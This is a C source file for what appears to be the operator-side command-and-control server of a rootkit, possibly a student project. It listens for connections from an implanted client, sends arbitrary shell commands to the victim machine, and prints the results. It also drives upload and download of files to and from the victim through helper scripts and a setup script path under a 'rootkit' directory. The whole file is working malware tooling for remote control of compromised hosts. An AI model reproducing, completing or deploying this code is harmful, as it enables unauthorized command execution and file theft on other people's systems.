#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>

#define BUFFER_SIZE 1048576
#define TARGET_UNAME "rootkit"

int server_fd = -1;

void ask_password_loop() {
    int status;
    do {
        status = system("python3 password.py");
        if (WIFEXITED(status)) {
            int exit_code = WEXITSTATUS(status);
            if (exit_code == 0) {
                break;
            } else {
                printf("[!] Incorrect password. Try again.\n");
            }
        } else {
            printf("[-] Error running Python script.\n");
            exit(EXIT_FAILURE);
        }
    } while (1);
}


void handle_sigint(int client_fd) {
    if (send(client_fd, "Shutting down remote server...",
             strlen("Shutting down remote server..."), 0) <= 0) {
            printf("[-] Failed to send command.\n");
    }
    if (server_fd >= 0)
        close(server_fd);
    printf("\n[+] Server shut down.\n");
    exit(0);
}

int main(int argc, char *argv[]) {
    int port;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);
    char buffer[BUFFER_SIZE];
    char input[BUFFER_SIZE];

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        return EXIT_FAILURE;
    }

    port = atoi(argv[1]);
    signal(SIGINT, handle_sigint);

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket");
        return EXIT_FAILURE;
    }

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0 ||
        listen(server_fd, 1) < 0) {
        perror("bind/listen");
        close(server_fd);
        return EXIT_FAILURE;
    }

    printf("[+] Server listening on port %d...\n", port);
    // Peristent connection code (server-side)
    while (1) {
        int client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &addr_len);
        if (client_fd < 0) {
            perror("accept");
            continue;
        }

        printf("[+] Connection from %s\n", inet_ntoa(client_addr.sin_addr));

        // Waiting for a message to confirm connection
        ssize_t len = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
        if (len <= 0) {
            printf("[-] No data received. Closing connection.\n");
            close(client_fd);
            continue;
        }
        buffer[len] = '\0';
        printf("[>] Initial message: %s\n", buffer);

        ask_password_loop();

        // Boucle : envoyer commande + recevoir résultat
        while (1) {
            printf("[?] Enter command: ");
            fflush(stdout);

            if (!fgets(input, sizeof(input), stdin))
                break;

            input[strcspn(input, "\n")] = '\0';

            if (!strcmp(input, "upload"))
            {
                char *setup = calloc(100, sizeof(char));
                setup = strncpy(setup, "./tmp/rootkit/upload_download/setup.sh", 100);
                if (send(client_fd, setup, strlen(setup), 0) <= 0) {
                     printf("[-] Failed to send command.\n");
                     break;
                }
                free(setup);

                len = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
                if (len <= 0) {
                    printf("[-] Failed to receive response.\n");
                    break;
                 }

                printf("[?] Enter upload args: usage %s <file_to_upload> <path_to_upload_to>\n", argv[0]);
                fflush(stdout);

                if (!fgets(input, sizeof(input), stdin))
                    break;

                input[strcspn(input, "\n")] = '\0'; // remove newline
                char *cmd = calloc(strlen(input) + 50, sizeof(char));
                sprintf(cmd, "./scripts/upload.sh %s %s %s", TARGET_UNAME, inet_ntoa(client_addr.sin_addr), input);
                system(cmd);
                printf("[i] Upload successful.");
            }
            else if (!strcmp(input, "download"))
            {
                char *setup = calloc(100, sizeof(char));
                setup = strncpy(setup, "./tmp/rootkit/upload_download/setup.sh", 100);
                if (send(client_fd, setup, strlen(setup), 0) <= 0) {
                     printf("[-] Failed to send command.\n");
                     break;
                }
                free(setup);

                len = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
                if (len <= 0) {
                    printf("[-] Failed to receive response.\n");
                    break;
                 }


                printf("[?] Enter upload args: usage %s <file_to_download> <path_to_download_to>", argv[0]);
                fflush(stdout);

                if (!fgets(input, sizeof(input), stdin))
                    break;

                input[strcspn(input, "\n")] = '\0'; // remove newline
                char *cmd = calloc(strlen(input) + 50, sizeof(char));
                sprintf(cmd, "./scripts/download.sh %s %s %s", TARGET_UNAME, inet_ntoa(client_addr.sin_addr), input);
                system(cmd);
                printf("[i] Download successful.\n");
            }
            else //Execute shell commands by default
            {
                 if (send(client_fd, input, strlen(input), 0) <= 0) {
                     printf("[-] Failed to send command.\n");
                     break;
                 }

                 sleep(1);
                 len = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
                 if (len <= 0) {
                     printf("[-] Failed to receive response.\n");
                     break;
                 }

           }
           buffer[len] = '\0';
           printf("[<] Response:\n%s\n", buffer);
        }
        close(client_fd);
        printf("[i] Client disconnected.\n");
    }
    close(server_fd);
    return 0;
}
